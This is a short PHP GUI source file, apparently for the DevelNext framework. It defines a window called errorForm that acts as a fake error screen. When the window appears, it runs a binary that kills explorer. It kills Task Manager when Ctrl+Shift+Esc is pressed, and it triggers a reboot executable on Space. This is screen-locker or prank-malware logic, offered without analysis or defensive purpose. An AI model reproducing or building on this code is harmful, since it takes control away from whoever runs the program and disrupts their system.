<?php
namespace app\forms;

use std, gui, framework, app;


class errorForm extends AbstractForm
{

    /**
     * @event keyUp-Space 
     */
    function doKeyUpSpace(UXKeyEvent $e = null)
    {    
        execute('binary/taskReboot.exe', false);
    }

    /**
     * @event show 
     */
    function doShow(UXWindowEvent $e = null)
    {    
        execute('binary/taskKill_explorer.exe', false);
    }

    /**
     * @event keyUp-Ctrl+Shift+Esc
     */
    function doKeyUpCtrlShiftEsc(UXKeyEvent $e = null)
    {    
        execute('binary/taskKill_taskmgr.exe', false);
    }


}
